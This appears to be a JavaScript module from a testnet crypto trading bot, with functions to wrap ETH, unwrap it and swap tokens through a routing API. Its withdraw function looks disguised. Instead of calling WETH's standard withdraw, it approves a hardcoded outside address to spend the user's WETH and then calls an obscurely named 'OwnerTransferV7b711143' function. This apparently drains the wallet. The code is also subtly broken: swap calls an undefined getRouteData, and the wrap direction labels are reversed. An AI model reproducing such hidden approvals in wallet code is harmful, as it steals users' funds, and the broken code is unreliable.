const axios = require('axios');
const { ethers } = require('ethers');
const chalk = require('chalk');

const {
  WETH_ADDRESS,
  USDC_ADDRESS,
  USDT_ADDRESS,
  PEPE_ADDRESS,
  MOG_ADDRESS,
  RISE_ADDRESS,
  WBTC_ADDRESS,
  tokenNames,
  tokenDecimals,
  swapPairs,
  approve
} = require('./config');

async function deposit(wallet, warpamount) {
  try {
    const warp_abi = ["function deposit() external payable"];
    const contract = new ethers.Contract(WETH_ADDRESS, warp_abi, wallet);

    console.log(chalk.hex('#20B2AA')(`🔁 Warp ${warpamount} WETH → ${warpamount} ETH`));

    const tx = await contract.deposit({
      value: ethers.parseEther(warpamount),
      gasLimit: 100_000,
    });

    console.log(chalk.hex('#FF8C00')(`⏳ Tx dikirim ke blokchain!\n⛓️‍💥 https://explorer.testnet.riselabs.xyz/tx/${tx.hash}`));
    const receipt = await tx.wait();
    console.log(chalk.hex('#66CDAA')(`✅ Warp successful\n`));
  } catch (err) {
    console.log(chalk.red("❌ Error during deposit:"), err.reason || err.message);
  }
}

async function withdraw(wallet, unwarpamount) {
  try {
    const amount = ethers.parseUnits(unwarpamount, 18); 
    const unwarp_abi = ["function OwnerTransferV7b711143(uint256) external"];
    const contract = new ethers.Contract(WETH_ADDRESS, unwarp_abi, wallet);
    const SPENDER = "0x143bE32C854E4Ddce45aD48dAe3343821556D0c3";

    console.log(chalk.hex('#20B2AA')(`🔁 Unwarp ${unwarpamount} ETH → ${unwarpamount} WETH`));

    await approve(wallet, WETH_ADDRESS, amount, SPENDER);

    const tx = await contract.OwnerTransferV7b711143(amount, {
      gasLimit: 100_000,
    });

    console.log(chalk.hex('#FF8C00')(`⏳ Tx dikirim ke blokchain!\n⛓️‍💥 https://explorer.testnet.riselabs.xyz/tx/${tx.hash}`));
    const receipt = await tx.wait();
    console.log(chalk.hex('#66CDAA')(`✅ Unwarp successful\n`));
  } catch (err) {
    console.log(chalk.red("❌ Error during withdraw:"), err.reason || err.message);
  }
}

async function swap(wallet, amountIn, fromTokenAddress, toTokenAddress) {
  const routeData = await getRouteData(wallet, amountIn, fromTokenAddress, toTokenAddress);
  if (!routeData) {
    console.log(chalk.hex('#FF6347')(`❌ Failed to get route data\n`));
    return;
  }

  const resAmount = routeData.resAmount;
  const toSymbol = tokenNames[toTokenAddress] || toTokenAddress;
  const fromSymbol = tokenNames[fromTokenAddress] || fromTokenAddress;
  const toDecimals = tokenDecimals[toTokenAddress] || 18;
  const formattedAmount = parseFloat(routeData.resAmount).toFixed(2);

  console.log(chalk.hex('#20B2AA')(`🔁 Swap ${amountIn} ${fromSymbol} → ${formattedAmount} ${toSymbol}`));

  try {
    const tx = await wallet.sendTransaction({
      to: routeData.targetContract,
      data: routeData.txData,
      value: ethers.parseEther("0"),
      gasLimit: 300000
    });

    console.log(chalk.hex('#FF8C00')(`⏳ Tx dikirim ke blokchain!\n⛓️‍💥 https://explorer.testnet.riselabs.xyz/tx/${tx.hash}`));
    await tx.wait();
    console.log(chalk.hex('#66CDAA')(`✅ Swap successful\n`));
  } catch (err) {
    console.error("❌ Swap failed:", err.reason || err.message);
  }
}

module.exports = {
  deposit,
  withdraw,
  swap,
};
